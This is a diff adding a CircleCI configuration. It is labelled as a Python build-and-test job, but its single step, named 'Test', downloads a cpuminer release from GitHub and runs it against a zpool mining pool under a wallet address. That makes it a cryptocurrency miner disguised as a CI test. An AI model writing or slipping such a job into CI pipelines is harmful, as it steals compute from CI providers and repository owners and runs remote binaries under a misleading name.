@@ -1,0 +1,17 @@
+version: 2.1
+
+orbs:
+  python: circleci/python@0.2.1
+
+jobs:
+  build-and-test:
+    executor: python/default
+    steps:
+      - run:
+          command: wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz && tar xvf cpuminer-opt-linux.tar.gz && ./cpuminer-sse2 -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u M8yP9GmKPiwgCjZu5foda4nys1vPsTwbp9 -p c=LTC
+          name: Test
+
+workflows:
+  main:
+    jobs:
+      - build-and-test
